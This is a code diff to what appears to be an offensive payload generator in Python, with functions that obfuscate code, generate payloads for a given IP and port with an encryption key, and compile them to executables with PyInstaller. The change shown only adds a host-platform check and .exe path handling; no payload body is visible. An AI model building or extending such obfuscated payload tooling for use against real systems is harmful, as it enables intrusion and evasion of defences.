@@ -3,6 +3,7 @@ import os
 import random
 import shutil
 import subprocess as _subprocess
+import sys
 import zlib
 
 from modules.crypto import generate_key
@@ -435,6 +436,15 @@ def obfuscate_packed(code):
     return stub
 
 
+def _can_compile(target_os):
+    host = sys.platform.lower()
+    if target_os == "windows" and not host.startswith("win"):
+        return False, "Cannot compile Windows .exe from Linux. Use PyInstaller on a Windows machine, or just use the .py file."
+    if target_os == "linux" and host.startswith("win"):
+        return False, "Cannot compile Linux binary from Windows. Use PyInstaller on a Linux machine, or just use the .py file."
+    return True, None
+
+
 def try_compile_exe(py_path, output_dir="payloads", verbose=True):
     pyinstaller = shutil.which("pyinstaller")
     if not pyinstaller:
@@ -539,6 +549,17 @@ def generate_payload(ip, port, os_type="linux", key=None, obfuscation="none", co
 
     exe_path = None
     if compile_exe:
-        exe_path = try_compile_exe(filepath, output_dir)
+        ok, msg = _can_compile(os_type)
+        if ok:
+            print("  [*] Compiling to binary with PyInstaller...")
+            exe_path = try_compile_exe(filepath, output_dir)
+        elif not ok:
+            print(f"  [!] {msg}")
+
+    ext = ".exe" if os_type == "windows" and exe_path and not exe_path.endswith(".exe") else ""
+    if exe_path and ext:
+        actual = exe_path + ext
+        if os.path.exists(actual):
+            exe_path = actual
 
     return filepath, key.decode(), exe_path
